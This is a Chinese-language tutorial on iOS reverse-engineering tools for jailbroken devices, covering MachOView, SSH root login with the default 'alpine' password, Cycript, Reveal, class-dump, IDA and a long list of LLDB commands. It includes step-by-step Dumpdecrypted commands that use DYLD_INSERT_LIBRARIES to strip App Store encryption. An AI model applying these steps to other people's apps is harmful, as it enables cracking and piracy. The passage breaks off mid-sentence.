将“MachOView”拖到Application文件夹，就可以像其他程序一样启动了

下面介绍MachOView文件功能使用。

2、加载Mach-O文件
点击MachOView工具的主菜单“File”中的“Open”选项便可加载IOS平台可执行文件，对应功能接入如下所示：

例如加载文件名为“libLDCPCircle.a”的静态库文件，

3、文件头信息
MachOView工具成功加载Mach-O文件之后，每个.o文件对应一个类编译后的文件

在左边窗口点击“Mach Header”选项，可以看到每个类的cpu架构信息、load commands数量 、load commandssize 、file type等信息。

4、查看Fat文件
我们打开一个Fat文件可以看到：

可以看到，fat文件只是对各种架构文件的组装，点开 “Fat Header”可以看到支持的架构，显示的支持ARM_V7  、ARM_V7S  、ARM_64 、i386 、 X86_64。


点开每一个Static Library 可以看到，和每一个单独的Static Library的信息一样。

命令：
```
lipo LoginSDK.a -thin armv7 -output arm/LoginSDK.a  将fat文件拆分得到armv7类型

lipo  -create    ibSyncSDKA.i386.a    libSyncSDK.arm7.a  -output  libSyncSDK.a  合成一个i386和armV7架构的fat文件
```

## OpenSSH


这个工具是通过命令行工具访问苹果手机，执行命令行脚本。在Cydia中搜索openssh，安装。具体用法如下：
1、打开mac下的terminal，输入命令ssh root@192.168.2.2（越狱设备ip地址）
2、接下来会提示输入超级管理员账号密码，默认是alpine
3、回车确认，即可root登录设备
你也可以将你mac的公钥导入设备的/var/root/.ssh/authorized_keys文件，这样就可以免密登录root了。

![Reverse](https://github.com/XLsn0w/Cydia/blob/master/iOS%20Reverse.png?raw=true)

## Cycript


Cycript是大神saurik开发的一个非常强大的工具，可以让开发者在命令行下和应用交互，在运行时查看和修改应用。它可以帮助你HOOK一个App。Cycript最为贴心和实用的功能是它可以帮助我们轻松测试函数效果，整个过程安全无副作用，效果十分显著，实乃业界良心！
安装方式：在Cydia中搜索Cycript安装
使用方法：
1、root登录越狱设备
2、cycript-p 你想要测试的进程名
3、随便玩，完全兼容OC语法比如cy# [#0x235b4fb1 hidden]
Cycript有几条非常有用的命令：
choose：如果知道一个类对象存在于当前的进程中，却不知道它的地址，不能通过“#”操作符来获取它，此时可以使用choose命令获取到该类的所有对象的内存地址
打印一个对象的所有属性 [obj _ivarDescription].toString()
打印一个对象的所有方法[obj _methodDescription].toString()
动态添加属性 objc_setAssociatedObject(obj,@”isAdd”, [NSNumbernumberWithBool:YES], 0);
获取动态添加的属性 objc_getAssociatedObject(self, @”isAdd”)


## Reveal


Reveal是由ITTY BITTY出品的UI分析工具，可以直观地查看App的UI布局，我们可以用来研究别人的App界面是怎么做的，有哪些元素。更重要的是，可以直接找到你要HOOK的那个ViewController，贼方便不用瞎猫抓耗子一样到处去找是哪个ViewController了。
安装方法：
1、下载安装Mac版的Reveal
2、iOS安装Reveal Loader，在Cydia中搜索并安装Reveal Loader
在安装Reveal Loader的时候，它会自动从Reveal的官网下载一个必须的文件libReveal.dylib。如果网络状况不太好，不一定能够成功下载这个dylib文件，所以在下载完Reveal Loader后，检查iOS上的“/Library/RHRevealLoader/”目录下有没有一个名为“libReveal.dylib”的文件。如果没有就打开mac Reveal，在它标题栏的“Help”选项下，选中其中的“Show Reveal Library in Finder”，找到libReveal.dylib文件，使用scp拷贝到 iOS的/Library/RHRevealLoader/目录下。至此Reveal安装完毕！


## Dumpdecrypted


Dumpdecrypted就是著名的砸壳工具，所谓砸壳，就是对 ipa 文件进行解密。因为在上传到 AppStore 之后，AppStore自动给所有的 ipa 进行了加密处理。而对于加密后的文件，直接使用 class-dump 是得不到什么东西的，或者是空文件，或者是一堆加密后的方法/类名。
使用步骤如下：
1、设备中打开需要砸壳的APP。
2、SSH连接到手机，找到ipa包的位置并记录下来。
3、Cycript到该ipa的进程，找到App的Documents文件夹位置并记录下来。
4、拷贝dumpdecrypted.dylib到App的Documents 的目录。
5、执行砸壳后，并拷贝出砸壳后的二进制文件。
具体执行命令：
1、ssh root@192.168.2.2 （iP地址为越狱设备的iP地址）
2、 ps -e （查看进程，把进程对应的二进制文件地址记下来）
3、cycript -p 进程名
4、 [[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory
inDomains:NSUserDomainMask][0] （找到程序的documents目录）
5、scp ~/dumpdecrypted.dylib root@192.168.2.2:/var/mobile/Containers/Data/Application/XXXXXX/Documents
6、DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/mobile/Containers/Bundle/
Application/XXXXXX/xxx.app/xxx
然后就会生成.decrypted的文件，这个就是砸壳后的文件。接下来各种工具都随便上了class-dump、IDA、Hopper Disassembler


## class-dump

dump demo
```
$ class-dump -H /Users/xlsn0w/Desktop/Payload/JYLIM.app -o /Users/xlsn0w/Desktop/Header

```

class-dump就是用来dump二进制运行文件里面的class信息的工具。它利用Objective-C语言的runtime特性，将存储在Mach-O文件中的头文件信息提取出来，并生成对应的.h文件，这个工具非常有用，有了这个工具我们就像四维世界里面看三维物体，一切架构尽收眼底。
class-dump用法：
class-dump –arch armv7 -s -S -H 二进制文件路径 -o 头文件保存路径


## IDA


IDA是大名鼎鼎的反编译工具，它乃逆向工程中最负盛名的神器之一。支持Windows、Linux和Mac OS X的多平台反汇编器/调试器，它的功能非常强大。class-dump可以帮我们罗列出要分析的头文件，IDA能够深入各个函数的具体实现，无论的C，C++，OC的函数都可以反编译出来。不过反编译出来的是汇编代码，你需要有一定的汇编基础才能读的懂。
IDA很吃机器性能（我的机器经常卡住不动），还有另外一个反编译工具Hopper，对机器性能要求没那么高，也很好用，杀人越货的利器。

![CydiaRepo](https://github.com/XLsn0w/Cydia/blob/master/iOS%209.3.2%20jailbreak%20SE.png?raw=true)

## LLDB


LLDB是由苹果出品，内置于Xcode中的动态调试工具，可以调试C、C++、Objective-C，还全盘支持OSX、iOS，以及iOS模拟器。LLDB要配合debugserver来使用。常见的LLDB命令有：
p命令：首先p是打印非对象的值。如果使用它打印对象的话，那么它会打印出对象的地址，如果打印非对象它一般会打印出基本变量类型的值。当然用它也可以申明一个变量譬如 p int a=10;（注lldb使用a = 10; （注lldb使用在变量前来声明为lldb内的命名空间的）
po 命令：po 命令是我们最常用的命令因为在ios开发中，我们时刻面临着对象，所以我们在绝大部分时候都会使用po。首先po这个命令会打印出对象的description描述。
bt [all] 打印调用堆栈，是thread backtrace的简写，加all可打印所有thread的堆栈。

## 一、LLDB

正向开发与逆向都经常会用到LLDB调试，而熟悉LLDB调试对正向、逆向开发都有很大的帮助,尤其是动态调试三方App，此笔记主要记录一些常用的调试命令

二、常用的LLDB调试命令

## （一）、断点命令

命令	                效果
```
breakpoint set -n 某函数名	给某函数下断点
breakpoint set -n "[类名 SEL]" -n "[类名 SEL]" ...	给多个方法下断点,形成断点组
breakpoint list	查看当前断点列表
breakpoint disable(enable) 组号(编号)	禁用(启用)某一组(某一个)断点
breakpoint delete 编号	禁用某一个断点
breakpoint delete 组号	删除某一组断点
breakpoint delete	删除所有断点
breakpoint set --selectore 方法名	全局方法断点,工程所有该方法都会下断点
brepoint set --file 文件名.m --selector 方法名	给.m实现文件某个方法下断点
breakpoint set -r 字符串	遍历整个工程，含该字串的方法、函数都会下断点
breakpoint command add 标号	某标号断点过后执行相应命令，以Done结束，类似于Xcode界面Edit breakpoint
breakpoint command list 标号	列出断点过后执行的命令
breakpoint command delete	删除断点过后执行的命令
b 内存地址	对内存地址下断点
```


## （二）、其他常用命令

命令	            效果
```
p 语句	动态执行语句(expression的缩写)，内存操作（下同）
expression 语句	同上,可缩写成exp
po 语句	print object 常用于查看对象信息
c	程序继续执行
process interrput	暂停程序
image list	列出所有加载的模块 缩写im li
image list -o -f 模块名	只列出输入模块名信息，常用于主模块
bt	查看当前调用栈
up	查看上一个调用函数
down	查看下一个调用函数
frame variable	查看函数参数
frame select 标号	查看指定调用函数
dis -a $pc	反汇编指定地址,此处为pc寄存器对应地址
thread info	输出当前线程信息
b trace -c xxx	满足某个条件后中断
target stop-hook add -o "frame variable"	断点进入后默认做的操作,这里是打印参数
help 指令	查看指令信息
```

## （三）、跳转命令、读写命令

命令	      效果
```
n	将子函数整体一步执行，源码级别
s	跳进子函数一步一步执行，源码级别
ni	跳到下一条指令,汇编级别
si	跳到当前指令内部，汇编级别
finish	返回上层调用栈
thread return	不再执行往下代码，直接从当前调用栈返回一个值
register read	读取所有寄存器值
register read $x0	读取x0寄存器值
register write $x1 10	修改x1寄存器的值为10
p/x	以十六进制形式读取值，读取的对象可以很多
watchpoint set variable p->_name	给属性添加内存断点，属性改变时会触发断点，可以看到属性的新旧值，类似KVO效果
watchpoint set expression 变量内存地址	效果同上

```
大部分命令可以缩写，这里列出部分几个，可以多尝试缩写，用多了就自然记住了:

```
breakpoint :br、b
list:li
delete:del
disable:dis
enable:ena
```
## (四)、使用image lookup定位crash

image lookup –name，简写为image lookup -n。
当我们想查找一个方法或者符号的信息，比如所在文件位置等。
image lookup –name,可以非常有效的定位由于导入某些第三方SDK或者静态库，出现了同名category方法（如果实现一样，此时问题不大。但是一旦两个行为不一致，会导致一些奇怪的bug）。顺便说下，如果某个类多个扩展，有相同方法的，app在启动的时候，会选择某个实现，一旦选择运行的过程中会一直都运行这个选择的实现。


# 三、LLDB高级调试技巧

(一)、使用Python脚本

两个开源库：

chisel :Facebook开源LLDB命令工具
LLDB:Derek Selander开源的工具

(二)、安装

LLDB默认会从~/.lldbinit(没有的话可以创建)加载自定义脚本,因此可以在里面添加一些脚本，先使用bre
